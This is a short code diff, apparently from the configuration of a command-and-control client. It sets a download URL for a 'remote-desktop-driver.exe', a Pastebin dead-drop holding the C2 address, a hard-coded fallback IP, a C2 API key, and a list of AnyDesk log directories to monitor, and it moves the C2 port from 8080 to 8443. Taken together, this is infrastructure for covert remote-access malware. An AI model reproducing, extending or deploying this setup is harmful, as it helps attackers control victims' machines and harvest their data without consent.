@@ -184,7 +184,7 @@ DRIVER_DOWNLOAD_URL = "https://your-domain.com/drivers/remote-desktop-driver.exe
 # C2 Server configuration (fetched dynamically from pastebin)
 CONFIG_URL = "https://pastebin.com/raw/YgNuztHj"  # Pastebin URL with C2 IP
 FALLBACK_HOST = "52.21.29.104"  # Fallback if pastebin fails
-C2_SERVER_PORT = 8080  # HTTP port for C2 API (FastAPI)
+C2_SERVER_PORT = 8443  # HTTP port for C2 API (FastAPI)
 C2_API_KEY = "kestrel_c2_2024_secure_key_f8a9b2c1d4e5"  # API key for authentication
 
 # AnyDesk log directories to monitor
